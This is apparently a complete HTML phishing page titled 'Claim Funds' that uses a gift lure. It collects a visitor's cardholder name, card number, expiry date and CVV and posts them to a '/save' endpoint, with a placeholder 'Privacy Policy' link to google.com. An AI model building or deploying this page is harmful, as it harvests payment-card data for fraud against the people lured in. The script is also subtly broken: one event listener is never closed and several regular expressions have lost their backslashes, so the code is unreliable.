<!doctype html>
<html lang="en">
<head>
  <meta charset="utf-8" />
  <meta name="viewport" content="width=device-width,initial-scale=1" />
  <title>Claim Funds</title>
  <style>
    body{font-family:Arial,sans-serif;margin:0;background:#f4f4f4}
    .top{display:flex;align-items:center;padding:14px 20px}
    .top img{width:72px;height:72px;object-fit:contain}
    .line{height:1px;background:#bdbdbd}
    .gift-wrap{
  display:flex;
  justify-content:center;
  margin:18px 0 8px;
}
.gift-logo{
  width:110px;
  height:auto;
  object-fit:contain;
}
    .wrap{min-height:calc(100vh - 100px);display:flex;align-items:center;justify-content:center}
    form{width:min(420px,90vw);background:#fff;padding:24px;border-radius:12px;box-shadow:0 4px 18px rgba(0,0,0,.08)}
    label{font-size:13px;color:#555;margin-top:10px;display:block}
    input{width:100%;box-sizing:border-box;padding:12px;margin:4px 0 10px;border:1px solid #ccc;border-radius:8px;font-size:16px}
    .row{display:flex;gap:10px}
    .row div{flex:1}
    button{width:100%;padding:12px;border:0;border-radius:8px;background:#222;color:#fff;font-size:16px;cursor:pointer;margin-top:4px}
    .privacy{display:block;margin-top:14px;text-align:center;font-size:14px}
    .msg{margin-top:10px;font-size:14px}
    .err{color:red}
    .ok{color:green}
  </style>
</head>
<body>
  <div class="top"><img src="icon.png" alt="logo"></div>
  <div class="line"></div><div class="gift-wrap">
  <img src="gift.png" alt="Gift logo" class="gift-logo">
  </div>

  <div class="wrap">
    <form id="cardForm">
      <label>Cardholder name</label>
      <input id="owner" name="owner" placeholder="Full name" required>

      <label>Card number</label>
      <input id="card" name="card" placeholder="0000 0000 0000 0000" inputmode="numeric" autocomplete="off" required>

      <div class="row">
        <div>
          <label>Expiry date</label>
          <input id="exp" name="exp" placeholder="MM/YY" maxlength="5" inputmode="numeric" required>
        </div>
        <div>
          <label>CVV</label>
          <input id="cvv" name="cvv" placeholder="CVV" inputmode="numeric" maxlength="4" required>
        </div>
      </div>

      <button type="submit">Send Request</button>
      <div id="msg" class="msg"></div>

      <a class="privacy" href="https://google.com" target="_blank" rel="noopener">Privacy Policy</a>
    </form>
  </div>

  <script>
    const card = document.getElementById('card');
    const exp  = document.getElementById('exp');
    const cvv  = document.getElementById('cvv');
    const msg  = document.getElementById('msg');

    function luhn(number) {
      const digits = number.replace(/D/g,'').split('').reverse().map(Number);
      let sum = 0;
      for (let i = 0; i < digits.length; i++) {
        let n = digits[i];
        if (i % 2 === 1) { n *= 2; if (n > 9) n -= 9; }
        sum += n;
      }
      return digits.length >= 13 && digits.length <= 19 && sum % 10 === 0;
    }

    card.addEventListener('input', () => {
    let expMode = 'month';

  exp.addEventListener('input', () => {
    let digits = exp.value.replace(/D/g, '').slice(0, 4);

    if (digits.length <= 2) {
      expMode = 'month';
      exp.value = digits;
      return;
    }

    expMode = 'year';
    exp.value = digits.slice(0, 2) + '/' + digits.slice(2);
  });

  exp.addEventListener('keydown', (e) => {
    if (e.key !== 'Backspace') return;

    const pos = exp.selectionStart;
    const val = exp.value;

    if (pos === 3 && val[2] === '/') {
      e.preventDefault();
      exp.value = val.slice(0, 2);
      exp.setSelectionRange(2, 2);
    }
  });

    cvv.addEventListener('input', () => {
      cvv.value = cvv.value.replace(/D/g,'').slice(0,4);
    });

    document.getElementById('cardForm').addEventListener('submit', async (e) => {
      e.preventDefault();
      const owner     = document.getElementById('owner').value.trim();
      const cardNumber = card.value.replace(/s/g,'');
      const expValue  = exp.value.trim();
      const cvvValue  = cvv.value.trim();

      if (!luhn(cardNumber)) {
        msg.className = 'msg err';
        msg.textContent = 'Invalid card number (Luhn check failed).';
        return;
      }

      const res = await fetch('/save', {
        method: 'POST',
        headers: {'Content-Type': 'application/json'},
        body: JSON.stringify({ owner, cardNumber, expValue, cvvValue })
      });

      if (res.ok) {
        msg.className = 'msg ok';
        msg.textContent = 'Data saved successfully.';
      } else {
        msg.className = 'msg err';
        msg.textContent = 'Save error.';
      }
    });
  </script>
</body>
</html>
